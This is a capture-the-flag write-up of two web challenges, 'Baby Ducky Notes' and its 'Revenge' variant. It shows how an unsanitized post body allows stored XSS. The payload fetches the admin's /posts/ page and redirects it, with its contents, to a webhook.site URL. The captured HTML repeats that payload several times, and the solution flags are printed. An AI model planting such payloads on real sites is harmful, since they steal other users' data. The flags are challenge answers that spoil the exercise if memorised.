# BABY DUCKY NOTES

Category: Web

Funnily enough I solved `BABY DUCKY NOTES: REVENGE` before `BABY DUCKY NOTES`

We notice that there is a `/report` for a post, which mean it is probably XSS.

We then try putting in xss injections into the title and the post body:

```html
<script>console.log(1)</script>
```

The body is not sanitized! So let's run some js to fetch `/posts/` and send it back to us:
```html
<script>fetch("/posts/").then((r)=>r.text().then((a)=>{window.location.href = "https://webhook.site/<id>?c="+encodeURI(a)}))
</script>
```

We then find the flag, buried in the received html:

```html
<!DOCTYPE html> <html lang="en"> <head> <meta name="viewport" content="width=device-width"> <title>Baby Ducky Notes: Revenge!</title> <script src="/static/js/jquery.js"></script> <script src="/static/js/report.js"></script> <link rel="preconnect" href="https://fonts.googleapis.com"> <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <link rel="stylesheet" href="/static/css/styles.css" /> </head> <body> <nav class="navbar"> <div id="trapezoid"> <a href="/login" class="expandHome">Login</a> <a href="/register" class="expandHome">Register</a> <a href="/posts/view/admin" class="expandHome">View</a> <a href="/posts/create" class="expandHome">Create</a> </div> </nav> <div class="posts_list"> <ul class="posts_ul"> <li> <div class="blog_post"> <div class="container_copy"> <h1> Here is a ducky flag! </h1> <h3> admin </h3> <p> TFCCTF{Ev3ry_duCk_kn0w5_xSs!} </p> </div> </div> </li> <li> <div class="blog_post"> <div class="container_copy"> <h1> a </h1> <h3> rwandi </h3> <p> fetch("/posts/create").then((r)=>r.text().then((a)=>{window.location.href = "https://webhook.site/e13c37d6-c0ef-462d-a80d-9428baeb55d4?c=" a})) </p> </div> </div> </li> <li> <div class="blog_post"> <div class="container_copy"> <h1> a </h1> <h3> rwandi </h3> <p> <script>fetch("/posts/create").then((r)=>r.text().then((a)=>{window.location.href = "https://webhook.site/e13c37d6-c0ef-462d-a80d-9428baeb55d4?c=" a}))</script> </p> </div> </div> </li> <li> <div class="blog_post"> <div class="container_copy"> <h1> a </h1> <h3> rwandi </h3> <p> <script> fetch("/posts").then((r)=>r.text().then((a)=>{window.location.href = "https://webhook.site/e13c37d6-c0ef-462d-a80d-9428baeb55d4?c=" encodeURI(a)})) </script> </p> </div> </div> </li> </ul> </div> <div class="report"> <div class="message" id="alert-msg" hidden ></div> <button type="button" id="report-btn">Report to admin</button> </div> <footer> <div class="footer-content"> <p>copyright
```

```
TFCCTF{Ev3ry_duCk_kn0w5_xSs!}
```

For the original ducky notes we can also do the same thing:

```html
<!DOCTYPE html> <html lang="en"> <head> <meta name="viewport" content="width=device-width"> <title>Baby Ducky Notes</title> <script src="/static/js/jquery.js"></script> <script src="/static/js/report.js"></script> <link rel="preconnect" href="https://fonts.googleapis.com"> <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <link rel="stylesheet" href="/static/css/styles.css" /> </head> <body> <nav class="navbar"> <div id="trapezoid"> <a href="/login" class="expandHome">Login</a> <a href="/register" class="expandHome">Register</a> <a href="/posts/view/admin" class="expandHome">View</a> <a href="/posts/create" class="expandHome">Create</a> </div> </nav> <div class="posts_list"> <ul class="posts_ul"> <li> <div class="blog_post"> <div class="container_copy"> <h1> Here is a ducky flag! </h1> <h3> admin </h3> <p> TFCCTF{Adm1n_l0St_h1s_m1nd!} </p> </div> </div> </li> <li> <div class="blog_post"> <div class="container_copy"> <h1> a </h1> <h3> rwandi </h3> <p> <script> fetch("/posts/").then((r)=>r.text().then((a)=>{window.location.href = "https://webhook.site/e13c37d6-c0ef-462d-a80d-9428baeb55d4?c=" encodeURI(a)})) </script> </p> </div> </div> </li> <li> <div class="blog_post"> <div class="container_copy"> <h1> a </h1> <h3> rwandi </h3> <p> <script> fetch("/posts/").then((r)=>r.text().then((a)=>{window.location.href = "https://webhook.site/e13c37d6-c0ef-462d-a80d-9428baeb55d4?c=" encodeURI(a)})) </script> </p> </div> </div> </li> </ul> </div> <div class="report"> <div class="message" id="alert-msg" hidden ></div> <button type="button" id="report-btn">Report to admin</button> </div> <footer> <div class="footer-content"> <h3>Disclaimer</h3> <p>This challenge is made to be hacked. Any indication of proper usage or untapped activity will result in legal sanctions. Happy hacking!</p> </div> <div class="footer-bottom"> <p>copyright
```

```
TFCCTF{Adm1n_l0St_h1s_m1nd!}
```
